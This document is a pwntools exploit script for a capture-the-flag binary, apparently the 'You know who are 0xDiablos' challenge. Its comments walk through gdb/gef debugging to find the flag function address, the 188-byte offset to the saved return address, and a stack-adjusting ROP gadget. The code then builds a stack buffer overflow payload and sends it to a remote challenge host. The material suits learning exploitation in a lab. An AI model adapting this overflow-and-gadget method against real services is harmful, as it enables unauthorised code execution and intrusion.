# coding: utf-8
from pwn import *

# gef➤  info functions
# All defined functions:
# 
# Non-debugging symbols:
# 0x080491e2  flag
# 0x08049272  vuln
# 0x080492b1  main

# [!] flag function is at 0x080491e2

# =================================

# gef➤  disassemble vuln
# Dump of assembler code for function vuln:
#   <...>
#   0x0804929c <+42>:	lea    eax,[ebp-0xb8]
#   0x080492a2 <+48>:	push   eax
#   0x080492a3 <+49>:	call   0x8049070 <puts@plt>
#   0x080492a8 <+54>:	add    esp,0x10
#   0x080492ab <+57>:	nop
#   <...>
# End of assembler dump.

# [*] Set breakpoint in gdb right after puts
# gef➤ break *0x080492a8
# gef➤ run
# <...>

# [*] Input a few "A"s
# You know who are 0xDiablos:
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# 
# Breakpoint 1, 0x080492a8 in vuln ()
# <...>
# ───────────────────────────────────────────────────────────────────── stack ────
# 0xffffd050│+0x0000: 0xffffd060  →  "AAAAAAAAAAAAAAAAA"	 ← $esp
# 0xffffd054│+0x0004: 0xf7fa8d67  →  0xfaa0f40a
# 0xffffd058│+0x0008: 0x00000001
# 0xffffd05c│+0x000c: 0x08049281  →  <vuln+15> add ebx, 0x2d7f
# 0xffffd060│+0x0010: "AAAAAAAAAAAAAAAAA"
# 0xffffd064│+0x0014: "AAAAAAAAAAAAA"
# 0xffffd068│+0x0018: "AAAAAAAAA"
# 0xffffd06c│+0x001c: "AAAAA"

# [!] ESP is at 0xffffd060

# ================================

# gef➤  info frame
# Stack level 0, frame at 0xffffd120:
#  eip = 0x80492a8 in vuln; saved eip = 0x8049318
#  called by frame at 0xffffd150
#  Arglist at 0xffffd118, args: 
#  Locals at 0xffffd118, Previous frame's sp is 0xffffd120
#  Saved registers:
#   ebx at 0xffffd114, ebp at 0xffffd118, eip at 0xffffd11c

# [!] EIP is at 0xffffd11c

# ===============================

# gef➤  p/d 0xffffd11c - 0xffffd060
# $1 = 188

# [!] The length of area we need to fill with NOPs is 188.

# ==============================

# [*] Next, we need to find a gadget, that changes SP (Stack Pointer), to pass our arguments.
# root@parrot# ROPgadget --binary ./vuln | grep sp
# <...>
# 0x0804901b : add esp, 8 ; pop ebx ; ret
# <...>

# [*] Ideal.
# [!] Gadget is at 0x0804901b

# =============================

# [*] That's all we need for the exploit construction.

flag_addr = 0x080491e2
buffer_esp = 0xffffd060
buffer_eip = 0xffffd11c
gadget = 0x0804901b
fst_arg = 0xdeadbeef
snd_arg = 0xc0ded00d

nop_pad = "\x90" * (buffer_eip - buffer_esp)
payload = nop_pad + p32(flag_addr) + p32(gadget) + p32(fst_arg) + p32(snd_arg)

# [*] Exploiting.
HOST, PORT = "139.59.202.58", 32422
# r = process("./vuln")
r = remote(HOST, PORT)
r.recvuntil("You know who are 0xDiablos:")
r.sendline(payload)
print(r.recvall())
